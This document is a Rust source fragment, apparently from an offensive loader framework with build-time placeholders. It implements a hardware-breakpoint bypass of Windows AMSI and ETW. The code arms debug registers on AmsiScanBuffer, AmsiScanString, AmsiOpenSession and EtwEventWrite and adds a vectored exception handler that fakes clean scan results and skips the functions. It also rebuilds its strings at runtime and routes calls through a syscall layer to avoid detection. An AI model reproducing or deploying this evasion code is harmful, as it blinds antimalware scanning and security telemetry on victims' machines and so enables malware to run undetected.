// --- Hardware-breakpoint AMSI/ETW bypass (technique fragment) ---
//
// Emulates the watched exports with the CPU debug registers instead of patching
// them. An execute breakpoint on each export traps into a vectored exception
// handler that returns clean; the target's code is never modified.

use std::ffi::c_void;
use std::sync::atomic::{AtomicUsize, Ordering};

use windows::core::PCSTR;
use windows::Win32::Foundation::{EXCEPTION_SINGLE_STEP, HMODULE};
use windows::Win32::System::Diagnostics::Debug::{
    AddVectoredExceptionHandler, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
    EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH, EXCEPTION_POINTERS,
};
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Threading::GetCurrentThread;

/// Whether to watch `AmsiScanBuffer`, the buffer scan.
const WATCH_AMSI: bool = $WATCH_AMSI$;

/// Whether to also watch `AmsiScanString` (an extra debug register).
const WATCH_SCAN_STRING: bool = $WATCH_SCAN_STRING$;

/// Whether to also watch `AmsiOpenSession` (an extra debug register).
const WATCH_OPEN_SESSION: bool = $WATCH_OPEN_SESSION$;

/// Whether to watch `EtwEventWrite`, the event writer.
const WATCH_ETW: bool = $WATCH_ETW$;

/// Stack offset of the caller's `AMSI_RESULT*` from `Rsp` at `AmsiScanBuffer`'s
/// entry: it is the sixth argument, so it sits past the return address and the
/// 32-byte shadow space ([`Rsp+0x30`]).
const AMSI_SCAN_BUFFER_RESULT_OFFSET: usize = 0x30;

/// The same for `AmsiScanString`, whose `AMSI_RESULT*` is its fifth argument
/// ([`Rsp+0x28`]).
const AMSI_SCAN_STRING_RESULT_OFFSET: usize = 0x28;

/// `NtGetContextThread`/`NtSetContextThread` require a 16-byte aligned `CONTEXT`
/// on x64; the `windows` binding only guarantees 8, so force it (the same
/// wrapper the other context fragments use).
#[repr(align(16))]
struct AlignedContext(CONTEXT);

/// Address of the function watched by each debug register (DR0-DR3), published
/// for the handler. Zero means the slot is unused.
static WATCHED_ADDR: [AtomicUsize; 4] = [
    AtomicUsize::new(0),
    AtomicUsize::new(0),
    AtomicUsize::new(0),
    AtomicUsize::new(0),
];

/// Stack offset of the `AMSI_RESULT*` for the function in each slot, or zero
/// when the function has no out-parameter to clear (`EtwEventWrite`,
/// `AmsiOpenSession`).
static WATCHED_RESULT_OFFSET: [AtomicUsize; 4] = [
    AtomicUsize::new(0),
    AtomicUsize::new(0),
    AtomicUsize::new(0),
    AtomicUsize::new(0),
];

/// The vectored exception handler: it turns a debug-register trap on a watched
/// export into a "clean" return without letting the real function run.
///
/// An *execute* breakpoint fires before the instruction at the watched address,
/// so the handler returns `S_OK` (`Rax = 0`), stores `AMSI_RESULT_CLEAN` (0) in
/// the caller's out-parameter when the export has one, and resumes at the caller
/// by popping the return address. That is exactly what the software patch does,
/// but with no byte of the target modified.
unsafe extern "system" fn breakpoint_handler(info: *mut EXCEPTION_POINTERS) -> i32 {
    if info.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    let info = &*info;
    if info.ExceptionRecord.is_null() || info.ContextRecord.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }
    // Anything that is not a debug trap (`EXCEPTION_SINGLE_STEP`) is not ours.
    if (*info.ExceptionRecord).ExceptionCode != EXCEPTION_SINGLE_STEP {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let context = &mut *info.ContextRecord;
    let address = context.Rip as usize;
    for (slot, watched) in WATCHED_ADDR.iter().enumerate() {
        if address == 0 || watched.load(Ordering::Relaxed) != address {
            continue;
        }

        // Return clean: S_OK, and AMSI_RESULT_CLEAN when there is an
        // out-parameter to fill.
        context.Rax = 0;
        let offset = WATCHED_RESULT_OFFSET[slot].load(Ordering::Relaxed);
        if offset != 0 {
            let result_slot = (context.Rsp as usize).wrapping_add(offset) as *const *mut u32;
            let result = *result_slot;
            if !result.is_null() {
                *result = 0;
            }
        }

        // Pop the return address and jump to it, so the export returns at once.
        let return_address = *(context.Rsp as *const u64);
        context.Rip = return_address;
        context.Rsp = context.Rsp.wrapping_add(8);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    EXCEPTION_CONTINUE_SEARCH
}

/// Loads a library (a no-op when it is already loaded) and returns its base.
fn load_module(name: &str) -> Result<HMODULE, String> {
    let name = std::ffi::CString::new(name).map_err(|_| $MSG_LOAD_FAILED$)?;
    unsafe { LoadLibraryA(PCSTR(name.as_ptr() as *const u8)) }.map_err(|_| $MSG_LOAD_FAILED$)
}

/// Resolves an export, failing when it is absent.
fn resolve_export(module: HMODULE, name: &str) -> Result<usize, String> {
    let name = std::ffi::CString::new(name).map_err(|_| $MSG_RESOLVE_FAILED$)?;
    unsafe { GetProcAddress(module, PCSTR(name.as_ptr() as *const u8)) }
        .map(|function| function as usize)
        .ok_or($MSG_RESOLVE_FAILED$)
}

/// Resolves an export that may be absent (a best-effort variant).
fn try_resolve_export(module: HMODULE, name: &str) -> Option<usize> {
    let name = std::ffi::CString::new(name).ok()?;
    unsafe { GetProcAddress(module, PCSTR(name.as_ptr() as *const u8)) }
        .map(|function| function as usize)
}

/// Arms a hardware breakpoint on each watched AMSI/ETW export and installs the
/// vectored handler that returns clean when one traps.
///
/// Every kernel-facing call goes through the syscall layer's
/// `nt_get_context_thread` / `nt_set_context_thread`, so `mode: indirect`
/// removes the `GetThreadContext`/`SetThreadContext` imports. The library and
/// export names are substituted at build time by `Params::render_fragment` with
/// code that rebuilds them at runtime, so none reaches `.rdata`.
pub fn hardware_breakpoints() -> Result<bool, String> {
    // 1. Resolve the watched exports, each taking one of the four debug
    //    registers (DR0-DR3).
    let mut watch: [(usize, usize); 4] = [(0, 0); 4];
    let mut count = 0usize;

    if WATCH_AMSI {
        let amsi = load_module(&$AMSI_DLL_DEF$)?;
        watch[count] = (
            resolve_export(amsi, &$AMSI_SCAN_BUFFER_DEF$)?,
            AMSI_SCAN_BUFFER_RESULT_OFFSET,
        );
        count += 1;
        if WATCH_SCAN_STRING && count < 4 {
            if let Some(address) = try_resolve_export(amsi, &$AMSI_SCAN_STRING_DEF$) {
                watch[count] = (address, AMSI_SCAN_STRING_RESULT_OFFSET);
                count += 1;
            }
        }
        if WATCH_OPEN_SESSION && count < 4 {
            if let Some(address) = try_resolve_export(amsi, &$AMSI_OPEN_SESSION_DEF$) {
                watch[count] = (address, 0);
                count += 1;
            }
        }
    }
    if WATCH_ETW && count < 4 {
        let ntdll = load_module(&$NTDLL_DLL_DEF$)?;
        watch[count] = (resolve_export(ntdll, &$ETW_WRITE_DEF$)?, 0);
        count += 1;
    }
    if count == 0 {
        // Nothing selected (every watch flag disabled): a no-op.
        return Ok(true);
    }

    // 2. Publish the watch table and install the handler *before* arming, so a
    //    trap cannot fire while the handler is still missing.
    for (slot, (address, offset)) in watch.iter().take(count).enumerate() {
        WATCHED_ADDR[slot].store(*address, Ordering::Relaxed);
        WATCHED_RESULT_OFFSET[slot].store(*offset, Ordering::Relaxed);
    }
    unsafe {
        AddVectoredExceptionHandler(1, Some(breakpoint_handler));
    }

    // 3. Arm the debug registers of the current thread.
    let mut context = AlignedContext(CONTEXT::default());
    context.0.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
    let status = crate::nt_get_context_thread(
        unsafe { GetCurrentThread() },
        &mut context.0 as *mut CONTEXT as *mut c_void,
    );
    if status < 0 {
        return Err($MSG_CONTEXT_READ_FAILED$);
    }

    let mut dr7 = 0u64;
    for (slot, (address, _)) in watch.iter().take(count).enumerate() {
        let address = *address as u64;
        match slot {
            0 => context.0.Dr0 = address,
            1 => context.0.Dr1 = address,
            2 => context.0.Dr2 = address,
            _ => context.0.Dr3 = address,
        }
        // Local-enable bit (bit 2*slot); R/W and LEN stay 00 (an execute
        // breakpoint on the first byte).
        dr7 |= 1 << (slot * 2);
    }
    context.0.Dr7 = dr7;
    context.0.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;

    let status = crate::nt_set_context_thread(
        unsafe { GetCurrentThread() },
        &mut context.0 as *mut CONTEXT as *mut c_void,
    );
    if status < 0 {
        return Err($MSG_CONTEXT_ARM_FAILED$);
    }

    crate::tech_dbg!(
        "hardware_breakpoints",
        "armed {count} hardware breakpoint(s)"
    );
    // A Preparation always continues the pipeline; only the `bouncer` gate
    // decides to abort (see `techniques/README.md`).
    Ok(true)
}
